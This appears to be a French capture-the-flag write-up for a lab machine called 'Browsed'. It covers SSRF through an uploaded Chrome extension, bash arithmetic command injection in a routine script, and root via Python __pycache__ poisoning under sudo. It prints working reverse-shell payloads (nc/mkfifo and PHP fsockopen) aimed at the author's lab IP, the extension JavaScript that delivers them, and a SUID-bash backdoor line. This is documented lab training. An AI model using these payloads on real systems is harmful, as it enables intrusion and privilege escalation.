@@ -1,0 +1,232 @@
+On commence avec un nmap classique:
+└─$ nmap -p- -sV 10.129.5.16
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+http / ssh rien de bien interressant, commencons par le site web
+
+on tombe sur une page web "browsed.htb" (img: sc/browsed.jpg)
+rien qu'avec le titre on se doutait d'un CVE dans le browser mais avec le texte "People can share their chrome version 134 based extension" et la possibilité d'upload des extensions, on en est sûr
+
+il y a des instructions "To send us an extension, visit the upload page to upload your chrome extension, in zip format. Make sure your files are directly inside the archive, and not in a folder !"
+En cherchant sur internet des CVE je tombes sur cet article qui me semble TOTALEMENT A PROPOS
+https://www.cvedetails.com/cve/CVE-2025-1916/
+
+Google Chrome Use-After-Free Vulnerability in Profiles via Malicious Extension Leading to Heap Corruption
+Use after free in Profiles in Google Chrome prior to 134.0.6998.35 allowed an attacker who convinced a user to install a malicious extension to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: Medium)
+
+j'arrive pas a trouver de CVE convenable finalement,
+le fait qu'ils donnent les logs de chrome devrait me mettre sur une piste.
+je sais que c'est la version 134 donc je vais voir directement les cve fix dans la version 135 (bon c'est un peu meta comme strat mais je trouvais pas), et je tombes sur un CVE classé "high" qui dit "actions changed-files before 46 allows remote attackers to discover secrets by reading actions logs", ça parles de logs, mais je crois que ça a rien a voir avec chrome hmmm...
+
+en passant une extension pour trouver des infos sur les conditions d'execution j'envoies sur mon endpoint le window.location.href et je tombes sur 10.129.6.147 - - [22/Jan/2026 09:43:37] "GET /2?data=http://browsedinternals.htb/ HTTP/1.1" 404 -
+je rajoutes donc au /etc/hosts pour tester
+
+Nice je tombes sur un gitea (version 1.24.5) (img: sc/gitea.jpg)
+il y a un utilisateur nommé "Larry", la version ne semble pas avoir de vuln importantes, je me concentre donc sur le repo présent
+(img: sc/repo.jpg)
+README: "This webapp allows us to convert our md files to html. Still in developement, it should only run locally !!!" sous entends qu'il y aurait peut être une faille importante si exposée au public
+
+a PREMIERE vue, vraiment vittte fais il y a pas grand chose d'intéressant dans le code, le routine.sh qui a l'air de tourner en boucle peut peut-être etre une source de RCE si je peux modif une variable, mais ce qui m'attire pour l'instant c'est le dossier backups avec des tar, qu'y a t'il a l'interieur ?
+ok bon ils sont vraiment vide
+
+le app.py
+
+@app.route('/routines/<rid>')
+def routines(rid):
+    # Call the script that manages the routines
+    # Run bash script with the input as an argument (NO shell)
+    subprocess.run(["./routines.sh", rid])
+    return "Routine executed !"
+
+@app.route('/view/<filename>')
+def view_file(filename):
+    filename = secure_filename(filename)
+    if not filename.endswith('.html'):
+        return "Invalid filename", 400
+    return send_from_directory(FILES_DIR, filename)
+
+# The webapp should only be accessible through localhost
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5000)
+
+mtn je comprends, le service tourne en interne et grace aux extensions on doit ssrf sur des services internes
+
+alors bon la version simple et rapide c'est de faire un fetch dans l'extension, et de renvoyer le résultat avec une requete sur mon pc, mais je me demandes vraiment si je peux pas creer une extension qui me fait un proxy sur son pc (mais bon j'imagine que j'ai pas 15h et que l'extension est supprimée au bout de qq secondes), et si c'est juste pour une simple requête ça sert à rien.
+
+en me demandant ce que je devais executer directement, quelle routine de routine.sh je devais choisir avec le RID que je passe ici: @app.route('/routines/<rid>')
+def routines(rid):
+    # Call the script that manages the routines
+    # Run bash script with the input as an argument (NO shell)
+    subprocess.run(["./routines.sh", rid])
+
+et en pensant au rce je me suis rendu compte que la ligne vulnérable pourrait être celle là:
+
+log_action() {
+  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$ROUTINE_LOG"
+}
+...
+
+else
+  log_action "Unknown routine ID: $1"
+  echo "Routine ID not implemented."
+fi
+
+c'est la seule variable où je peux rentrer du texte,
+je reproduis une version simplifiée du script pour tester mes hypothèses d'injection
+
+#!/bin/bash
+
+log_action() {
+  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "./log.txt"
+}
+
+if [[ "$1" -eq 0 ]]; then
+  echo "Temporary files cleaned."
+
+elif [[ "$1" -eq 1 ]]; then
+  echo "Backup completed."
+
+elif [[ "$1" -eq 2 ]]; then
+  echo "Logs rotated."
+
+elif [[ "$1" -eq 3 ]]; then
+  echo "System info saved."
+
+else
+  log_action "Unknown routine ID: $1"
+  echo "Routine ID not implemented."
+fi
+
+mais je crois qu'en vrai il y a pas moyen djadja quand la variable est entre doubles guillemets.
+
+j'ai pas trop d'inspi, je vais au moins tenté un ssrf sur l'endpoint "/files" pour confirmer la présence du serveur et PEUT ETRE qu'il y aura des trucs intéressants, et effectivement je galère a accèder au serveur, j'ai des "failed to fetch" mais je ne sais pas si ça veut dire que j'arrive pas a joindre le process ou alors que je le join mal
+
+je me dis mtn que c'est peut être un cul de sac, j'arrive vraiment pas a acceder au truc.
+
+Après des jours a essayer je vais voir sur internet et il fallait rajouter le mode "no-cors" au fetch JE VAIS PETER UN CABLE, mais bon au moins je le saurais pour mes prochains ssrf
+
+en cherchant la faille je me rapelle que le [[ ]] interprete le code a l'interieur si mis entre $() dans
+if [[ "$1" -eq 0 ]]; then
+
+je le teste déjà en local et effecivement ça fonctionne (img: sc/proof.jpg)
+┌──(kali㉿kali)-[~/Documents/Browsed]
+└─$ ./routines_s.sh 'a[$(touch proof.txt)]'
+a[$(touch proof.txt)]
+Temporary files cleaned.
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Documents/Browsed]
+└─$ ls ./proof.txt                         
+./proof.txt
+
+il suffit maintenant d'intégrer le reverse shell et de l'encoder et l'envoyer au bon endroit
+
+a[$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.117 9333 >/tmp/f)]
+
+ok meme en l'encodant en url ça ne fonctionne pas, je télécharge donc le git pour le tester en local
+
+après pleins de tests en local je me rends compte que c'est les '/' qui posent probleme (meme encodés), une strat serait de décoder du base64 mais je sais qu'il y a php installé donc je vais passer par là:
+
+a[$(php -r '$sock=fsockopen("10.10.14.117",9333);exec("sh <&3 >&3 2>&3");')]
+
+encodé URL + le script
+
+const localUri = "http://10.10.14.117:9090"
+const payload = "a%5B%24%28php%20%2Dr%20%27%24sock%3Dfsockopen%28%2210%2E10%2E14%2E117%22%2C9333%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27%29%5D"
+fetch(localUri + '/received/' + payload)
+
+fetch(`http://127.0.0.1:5000/routines/${payload}`, {mode: 'no-cors'})
+.then((res) => {
+	fetch(localUri + '/1')
+	return res.text()
+})
+.then((data) => {
+	fetch(localUri + '/2')
+	fetch(localUri, {
+		method: 'POST',
+		body: data
+	})
+})
+.catch((e) => {
+	fetch(localUri + '/error?e=' + encodeURI(e.message))
+		fetch(localUri, {
+		method: 'POST',
+		body: e
+	})
+})
+
+et parfait je récup le reverse shell avec l'user larry directement et le flag se trouve dans le home ! (img: sc/user.jpg)
+
+
+env
+USER=larry
+SHLVL=0
+HOME=/home/larry
+OLDPWD=/home/larry/markdownPreview
+PYTHONUNBUFFERED=1
+SYSTEMD_EXEC_PID=1457
+WERKZEUG_SERVER_FD=3
+LOGNAME=larry
+JOURNAL_STREAM=8:10992
+_=/usr/bin/php
+MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/MarkdownPreview.service/memory.pressure
+PATH=/home/larry/markdownPreview/.env/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin
+INVOCATION_ID=503fa290218e44ffa4d8877b0ffbf01b
+LANG=en_US.UTF-8
+VIRTUAL_ENV_PROMPT=(.env) 
+SHELL=/bin/bash
+VIRTUAL_ENV=/home/larry/markdownPreview/.env
+PWD=/home/larry
+MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+
+
+larry@browsed:/$ sudo -l
+Matching Defaults entries for larry on browsed:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User larry may run the following commands on browsed:
+    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
+
+bon bah ça me semble evident le privesc, le fichier est lisible donc je l'analyse
+a premiere vue c'est un script qui permet de package des extension (les mettre sous forme de zip), je me dis qu'avec un lien symbolique il pourrait peut être package des dossiers inaccessibles pour moi.
+
+hmmm je peux ecrire dans pycache et sachant que c'est du cache pour les imports je me suis dit que je pourrais peut être l'empoisonner et apparement un article dit que c'est possible (en plus avec la même version de python que dans la box, quel hasard) https://dollarboysushil.com/posts/python-pycache-poisoning-privilege-escalation/
+
+extension_tool.py importe
+from extension_utils import validate_manifest, clean_temp_files
+
+je copie colle extension utils dans le tmp et je lui rajoute une petite ligne dans une des fonctions:
+
+...
+# --- Manifest validate ---
+def validate_manifest(path):
+    os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")
+    with open(path, 'r', encoding='utf-8') as f:
+        data = json.load(f)
+...
+
+ensuite je fais le script pour compiler le cache avec le flag UNCHECKED_HASH
+
+import py_compile
+from py_compile import PycInvalidationMode
+
+py_compile.compile(
+    "extension_utils.py",
+    cfile="extension_utils.cpython-312.pyc",
+    invalidation_mode=PycInvalidationMode.UNCHECKED_HASH
+)
+
+print("[+] Unchecked-hash pyc generated successfully")
+
+je compile puis je copie colle le fichier dans le __pycache__/
+et j'execute enfin le script:
+sudo ./extension_tool.py --ext Fontify
+
+et ça fonctionne j'ai le suid bash dans le tmp et donc le root flag (img: sc/root.jpg)
+TERMINÉ !
+
+Conclusions:
+Cet exo sans aucun cve est le genre d'exo que j'aime énormément, tout était assez simple, mes deux bloquages ont été la recherche de CVE avec les extensions (qui n'était pas une bonne piste, j'aurais dût commencer par faire de l'enumération avec ce que j'avais) et le 'no-cors' sur lequel j'ai passé beaucouuuuuuupppp de temps. Et le deuxième était le 'no-cors', je savais même pas que ça pouvais être un problème comme ça sans que j'ai des messages d'erreurs plus précis, j'aurais mis du temps à le découvrir. Après une fois découvert tout s'est terminé très rapidement et simplement, le root flag était vraiment ez. C'est une box que j'ai beaucoup appréciée
